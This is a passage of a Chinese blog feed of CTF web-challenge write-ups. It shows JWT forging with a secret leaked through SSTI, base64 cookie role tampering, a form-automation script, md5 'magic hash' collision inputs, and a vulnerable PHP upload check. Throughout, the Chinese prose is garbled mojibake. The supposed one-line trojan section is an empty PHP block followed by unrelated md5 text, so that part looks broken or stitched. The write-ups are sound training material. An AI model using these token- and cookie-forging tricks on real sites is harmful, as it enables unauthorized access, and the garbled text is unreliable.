class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is&quot;</span> + flag</span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>

<p>è¯¥ Web åº”ç”¨æœ‰ä¸¤ä¸ªè·¯ç”±ï¼š</p>
<p>&#x2F;ï¼ˆindex()ï¼‰ï¼š<br>è¯»å– app.py æ–‡ä»¶çš„å†…å®¹å¹¶è¿”å›ä½œä¸º HTTP å“åº”ã€‚<br>å¦‚æœç”¨æˆ·åœ¨ URL å‚æ•° name ä¸­æä¾›äº†ä¸€ä¸ªå€¼ï¼Œå°±ç”Ÿæˆä¸€ä¸ª JWT ä»¤ç‰Œï¼ˆæ’é™¤ â€œadminâ€ï¼‰ã€‚<br>ä»¤ç‰Œå­˜å‚¨åœ¨ token cookie ä¸­ã€‚<br>&#x2F;helloï¼ˆhello()ï¼‰ï¼š<br>æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æºå¸¦ token cookieï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é‡å®šå‘åˆ° &#x2F;ã€‚<br>è§£æ JWT ä»¤ç‰Œï¼Œæå– nameã€‚<br>å¦‚æœ name ä¸æ˜¯ â€œadminâ€ï¼Œå°±è¿”å›ä¸€æ¡ä¸ªæ€§åŒ–çš„æ¶ˆæ¯ã€‚<br>å¦‚æœ name æ˜¯ â€œadminâ€ï¼Œåˆ™æ¸²æŸ“ flag.htmlã€‚<br>æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·å¾—åˆ°token<br><img src="https://pic1.imgdb.cn/item/67b9fbe0d0e0a243d4023a6a.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="selector-class">.eyJuYW1lIjoiaGFjayJ9</span>.qBmUAhskQCDOFXDZfDBtaRmR92EJUo_xLiPa5VfHkKc</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè®¿é—® &#x2F;helloè·¯ç”±ï¼Œç”¨è¿™ä¸ªtokenä½œä¸ºcookieï¼Œç„¶åç”¨ä¸Šé¢˜ä¸€æ ·çš„sttiæ¼æ´<br><img src="https://pic1.imgdb.cn/item/67b9fc99d0e0a243d4023a7c.png"><br>å¾—åˆ°secretå’Œheaders<br><img src="https://pic1.imgdb.cn/item/67b9fcded0e0a243d4023ac8.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;secret&#x27;</span>: <span class="string">&#x27;u_have_kn0w_what_f0rmat_i5&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;headers&#x27;</span>: &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>&#125;, <span class="string">&#x27;User&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;secret.User&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå»ä¸€ä¸ªjwtåŠ å¯†ç½‘ç«™ <a href="http://jwt.io/">http://jwt.io/</a><br>è¿™æ˜¯ä¸ªç­¾åï¼Œæˆ‘ä»¬å…ˆæŠŠheadersä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åè¾“å…¥secretï¼Œæœ€åè¾“å…¥åˆšæ‰tokenã€‚å› ä¸ºè¿™æ ·æ‰æ˜¯è®¤è¯ç­¾å<br>å†æŠŠnameæ”¹æˆadmin<br><img src="https://pic1.imgdb.cn/item/67ba0211d0e0a243d4023ba9.png"></p>
<p>å¾—åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="selector-class">.eyJuYW1lIjoiYWRtaW4ifQ</span>.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg</span><br></pre></td></tr></table></figure></div>
<p>å†å»bpæŠŠè¿™ä¸ªadminçš„tokenç»™cookie</p>
<p><img src="https://pic1.imgdb.cn/item/67ba0466d0e0a243d4023bcc.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_2023web</title>
    <url>/posts/28713.html</url>
    <content><![CDATA[<p>MoeCTF_2023webæ–¹å‘WP</p>
<span id="more"></span>

<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>ä¸‹è½½readmeæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67bc62d8d0e0a243d4039e35.png"><br>æ ¹æ®readmeä¸­çš„å†…å®¹ï¼Œç”¨POSTè¯·æ±‚å‘é€jsonæ•°æ®åˆ›å»ºç”¨æˆ·<br><img src="https://pic1.imgdb.cn/item/67bc6396d0e0a243d4039f02.png"><br>ä½†æ˜¯åœ¨ç™»å½•çš„æ—¶å€™å‘ç°å¯†ç é”™è¯¯ï¼Œé‚£æˆ‘ä»¬å°±è‡ªå·±åˆ›å»ºä¸€ä¸ªç”¨æˆ·<br>ç™»å½•ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ªcookie<br>base64è§£ç ä¸€ä¸‹å¾—åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> eyJ1c2VybmFtZSI6ICJoYWNrZXIiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9  | <span class="built_in">base64</span> -d</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;   </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæˆ‘ä»¬çš„roleæ˜¯userï¼Œä¿®æ”¹æˆadminç„¶åå†base64ä¸€ä¸‹,æŠŠä¿®æ”¹è¿‡çš„cookieå†æ”¾åœ¨è¿™ä¸ªloginç•Œé¢ç™»å½•ï¼ŒæˆåŠŸ<br><img src="https://pic1.imgdb.cn/item/67bc66dfd0e0a243d403a31a.png"><br>æœ€åè®¿é—®&#x2F;flag æ‹¿åˆ°flag</p>
<p><img src="https://pic1.imgdb.cn/item/67bc670ed0e0a243d403a345.png"></p>
<h1 id="webå…¥é—¨æŒ‡åŒ—"><a href="#webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="webå…¥é—¨æŒ‡åŒ—"></a>webå…¥é—¨æŒ‡åŒ—</h1><p>åœ¨mdæ–‡ä»¶ä¸­æœ€åæ˜¯è¿™é¢˜è¦è§£ç çš„å†…å®¹ï¼Œè¿™æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²<br>å¯ç”¨åœ¨cyberchefè¿™ä¸ªå¹³å°ä¸Šè§£ç ï¼Œæˆ‘ç›´æ¥ç”¨kaliäº†ï¼Œè§£ç åæ˜¯ä¸€ä¸ªbase64å­—ç¬¦ä¸²ï¼Œå†è§£ç å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&quot;666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d&quot;</span> | xxd -r -p</span><br><span class="line">flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0= | <span class="built_in">base64</span> -d                                                                     </span><br><span class="line">moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;  </span><br></pre></td></tr></table></figure></div>

<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p><img src="https://pic1.imgdb.cn/item/67bc86ccd0e0a243d403b5b3.png"><br>è¿™é‡Œå°±åƒä¸€ä¸ªå°æ¸¸æˆ,ä½†æ˜¯åœ¨è¿™ä¹ˆçŸ­çš„æ—¶é—´å†…åšå®Œè¿™ä¸ªååº”è¿˜æ˜¯æœ‰ç‚¹éš¾ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬å§<br>é¦–å…ˆå…ˆçœ‹è¿™ä¸ªé¡µé¢çš„æºä»£ç ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°å‚æ•°ä¼ é€’çš„æ–¹æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--maybe id can help you locate the information--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>æ¯”èµ›å¼€å§‹ï¼<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span>å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>é€‰æ‰‹:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;steering_control&quot;</span>&gt;</span>æ–¹å‘æ§åˆ¶:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;-1&quot;</span>&gt;</span>å·¦<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">selected</span>&gt;</span>ç›´è¡Œ<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>å³<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;throttle&quot;</span>&gt;</span>æ²¹é—¨æ§åˆ¶:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">name</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>æ¾å¼€<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>ä¿æŒ<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">selected</span>&gt;</span>å…¨å¼€<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åè¿™é‡Œæˆ‘ä»¬çŸ¥é“æäº¤çš„æ–¹å¼æ˜¯POSTï¼Œç„¶åæ‰¾åˆ°æ¯ä¸€ä¸ªæ•°æ®çš„IDï¼Œè¿™é‡Œæœ‰<code>driver</code> <code>steering_control</code> <code>throttle</code><br>è¿™é‡Œå°±æ ¹æ®æ¯æ¬¡ä¼ é€’æ•°æ®ä¹‹åè¿”å›çš„ç»“æœæ¥å†³å®šä¸‹ä¸€æ¬¡çš„æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> <span class="operator">=</span> &#x27;http:<span class="operator">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">62839</span><span class="operator">/</span>&#x27;</span><br><span class="line">s<span class="attr">ession</span> <span class="operator">=</span> requests.session()</span><br><span class="line"></span><br><span class="line"><span class="attr">response</span> <span class="operator">=</span> session.post(url,data<span class="operator">=</span>&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;kakeru&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125;) <span class="comment">#å…ˆå‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œæ ¹æ®ç»“æœæ“ä½œ</span></span><br><span class="line"></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="attr">text</span> <span class="operator">=</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ–¹å‘æ§åˆ¶ï¼Œå’Œè¿”å›çš„æ–¹å‘ç›¸å</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;å‘å·¦&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    elif <span class="string">&quot;å‘å³&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="operator">-</span><span class="number">1</span></span><br><span class="line">    <span class="params">else :</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŠ“åœ°åŠ›åˆ¤æ–­ï¼Œæ²¹é—¨è¶Šå¤§ï¼ŒæŠ“åœ°åŠ›è¶Šå°</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;å¤ªå°&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    elif <span class="string">&quot;å¤ªå¤§&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    <span class="params">else:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Data</span> <span class="operator">=</span> &#123;</span><br><span class="line">        <span class="string">&quot;driver&quot;</span> : <span class="string">&quot;kakeru&quot;</span>,</span><br><span class="line">        <span class="string">&quot;steering_control&quot;</span> : data_1,</span><br><span class="line">        <span class="string">&quot;throttle&quot;</span> : data_2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">response</span> <span class="operator">=</span> session.post(url,data <span class="operator">=</span> Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> response.<span class="params">text :</span></span><br><span class="line">        print(response.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67bc8dbed0e0a243d403b736.png"></p>
<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p><img src="https://pic1.imgdb.cn/item/67bc8df2d0e0a243d403b73e.png"><br>è¿™é¢˜å°±æ˜¯è¦æ±‚æˆ‘ä»¬å¯¹httpå¤´ä¿®æ”¹<br><img src="https://pic1.imgdb.cn/item/67bc8ff0d0e0a243d403b775.png"></p>
<h1 id="meo-å›¾åºŠ"><a href="#meo-å›¾åºŠ" class="headerlink" title="meo å›¾åºŠ"></a>meo å›¾åºŠ</h1><p>ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ç›®<br>ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„phpæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> O.o?</span><br></pre></td></tr></table></figure></div>
<p>å°±æ˜¯è¾“å…¥ä¸¤ä¸ªä¸ä¸€æ ·çš„å€¼ç„¶åå®ƒä»¬çš„md5å€¼ä¸€æ ·ï¼Œè¿™å¾ˆç»å…¸äº†<br><code>http://127.0.0.1:55659/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=240610708&amp;param2=QNKCDZO</code><br>å¾—åˆ°flag</p>
<h1 id="moeå›¾åºŠ"><a href="#moeå›¾åºŠ" class="headerlink" title="moeå›¾åºŠ"></a>moeå›¾åºŠ</h1><p>è¿˜æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚è¿™é¢˜æ˜¯æç¤ºåªå…è®¸åç¼€æ˜¯pngçš„æ–‡ä»¶ï¼Œè¿˜æ˜¯å…ˆç”¨bpæ”¹ä¸€ä¸‹åç¼€è¯•è¯•,æ”¹å®Œæ˜¾ç¤ºåç¼€åä¸ç¬¦åˆè¦æ±‚<br>ç›®å½•æ‰«ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªupload.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶å¤ªå¤§&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåˆ¤æ–­çš„é€»è¾‘æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
